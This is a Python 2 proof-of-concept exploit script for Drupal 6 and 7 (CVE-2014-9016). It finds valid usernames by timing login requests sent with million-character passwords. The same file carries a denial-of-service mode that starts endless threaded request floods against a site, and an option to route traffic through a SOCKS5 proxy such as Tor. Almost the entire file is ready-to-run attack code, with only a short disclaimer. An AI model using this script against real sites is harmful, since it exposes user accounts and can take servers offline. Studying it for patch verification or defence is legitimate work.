#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import urllib
import httplib
import time
import socks
import socket
import argparse
import sys
from threading import *
try:

	import requests

except ImportError:

	print "It's necesary to install request Python module: sudo pip install requests."
	exit(1)

__license__="""

A PoC Python script to exploit Drupal 6.* 7.* User Enumeration Time-Based Attack:

Authors:
	c0r3dump | http://www.devconsole.info 
	Javier Nieto | http://www.behindthefirewalls.com/	

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors disclaims all responsibility in the use of this tool.

"""


def dpCheckversion(url):
	
	headers = {
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5"
	}
	r = requests.get(url+'/CHANGELOG.txt',headers=headers,verify=False)
	print "[+] Trying to detect the Drupal version in CHANGELOG.txt ..."

	if r.status_code == 404:
		print "[-] Unable to detect Drupal version. No CHANGELOG.txt file found."
		return
	
	result = r.text
	try:
		druf = result.find("Drupal")
		version = result[druf+7:12]
		mversion = int(result[druf+7:9])

	except ValueError,e:

		print "[-] Unable to detect Drupal version."
		print e
		
	print "[+] Version Drupal detected in CHANGELOG.txt ==> Drupal " + version
	print

def proxyConn(hostp,portp):

	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, hostp, int(portp))
	socket.socket = socks.socksocket

def url_ok(url):


	headers = {
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5"
	}
	try:
		rok = requests.get(url,headers=headers,verify=False,timeout=30)
		print "[+] The server " + "it's responding the status code: " + str(rok.status_code) 
		print 

	except :

		print "Unable to connect to " + str(url)
		exit(1)



def DosDP(url,user,chars):

        urlog=str(url)+'/?q=user'
	
	headers = [
		("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5")]

        password = "A"*chars
        data = [
                ("name",user),
                ("pass",password),
                ("form_id","user_login"),
                ("op","Log in")]

	
	timeStart = int(time.time())
	
	req = urllib2.Request(urlog, urllib.urlencode(dict(data)), dict(headers))

	try:

		response = urllib2.urlopen(req)

	except urllib2.URLError:
		
		pass


	except urllib2.HTTPError,e:

		print "[-]Error to open " + str(urlog) 
		print e.code

def ScanDrupal(url,user,chars):

        urlog=str(url)+'/?q=user'
        headers = [
                ("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5")]

        password = "A"*chars

        data = [
                ("name",user),
                ("pass",password),
                ("form_id","user_login"),
                ("op","Log in")]
        print "[+] Testing user " + str(user) + " @ " + urlog + " ..."

        timeStart = int(time.time())

        req = urllib2.Request(urlog, urllib.urlencode(dict(data)), dict(headers))
        try:

       		response = urllib2.urlopen(req)

        except:

		pass

       	timeDone = int(time.time())

       	delay = timeDone-timeStart
       	defTime = 10

       	if delay > defTime:
               	print "[+] The user " + str(user) + " exist. " + "Response time " + str(delay) + " second(s)."
               	return user

       	else:
               	print "[-] The user " + str(user) + " don't exist. " + "Response time " + str(delay) + " second(s)."



def main():
	parse = argparse.ArgumentParser(description='Python script for Drupal User Enumeration Time-Based Attack CVE-2014-9016 (PoC)')
	parse.add_argument('-u','--url', action='store', dest='url', help='URL to scan (http://127.0.0.1)')
	parse.add_argument('-U','--user', action='store', dest='user', help='User to scan')
	parse.add_argument('-f','--file', action='store', dest='ufile', help='File with user names')
	parse.add_argument('-n','--num', action='store', dest='num',default='1000000', help='Number of characters to use (default 1000000)')
	parse.add_argument('-d','--dos', action='store_true', dest='dos',help='Try to stablish a DOS condition')
	parse.add_argument('-t','--threads', action='store', dest='td',default='100', help='Number of connections attemps (every 10 seconds) for the DOS attack (default 100)')
	parse.add_argument('-c','--check', action='store_true', dest='check',help='Only ceck the Drupal version.')
	parse.add_argument('--proxy', action='store', dest='proxy', help='SOCKS 5 proxy, tipically TOR use: 127.0.0.1:9050')

	arg=parse.parse_args()
	users=[]
	userfdos=[]
	numuser = 0
	
	if arg.url == None:
 		parse.print_help()
 		exit(1)
	
	if arg.proxy != None:
		hostp = arg.proxy.split(":")[0]
		portp = arg.proxy.split(":")[1]
		proxyConn(hostp,portp)

	url = arg.url
	url_ok(url)

	if arg.check == True:
		dpCheckversion(url)
		exit(0)
	
	if arg.user == None and arg.ufile == None:
		parse.print_help()
		exit(1)
	if arg.user != None:
		users.append(arg.user)
		numuser = numuser + 1
	
	if arg.ufile != None:
		try:
			userFile = open (arg.ufile,'r')
			
			for line in userFile.readlines():
				line = line.split("\n")
				users.append(line[0])
				numuser = numuser + 1
		except IOError:
			print "The file %s doesn't exist." % (arg.ufile)
			print "Nothing to do."
			exit(1)
	
	chars = int(arg.num)
	
	print "Starting Drupal 6.* (with phpass module) 7.* User Enumeration Time-Based Attack Python CVE-2014-9016 script (PoC) for " + url + " at " + time.strftime("%x") + " " + time.strftime("%X") + " - for legal purposes only."
	print 
	print "[+] Searching for " + str(numuser) + " valid users, using " + arg.num + " characters."
	

	for user in users:
		usr=ScanDrupal(url,user,chars)
		if usr != None:
			userfdos.append(usr)
		else:
			userfdos.append(None)
	
 	ufd = None	
	for u in userfdos:
		if u != None:
			ufd = u

	if arg.dos == True:

		if ufd != None:
			threads = int(arg.td)
			user = ufd
		 	attp = 0
			print
			while 1:
				print "[+] Trying DOS with user " + str(user) + " using " + str(threads) + " connections attemps." 
				for att in range(threads):
					t = Thread(target=DosDP, args=(url, user, chars))
					try:
						t.start()
						attp = attp + 1
					except:
	      					pass 
				print "[+] After " + str(attp) + " connections attemps waiting 10 seconds in order to check the status of the server ..,"
				time.sleep(5)
				print "[+] Checking the server respond ...."
				url_ok(url)
				
		else:
			print "[-] No valid user found, impossible to make the DOS attack."
			exit(1)


if __name__=='__main__':
	main()
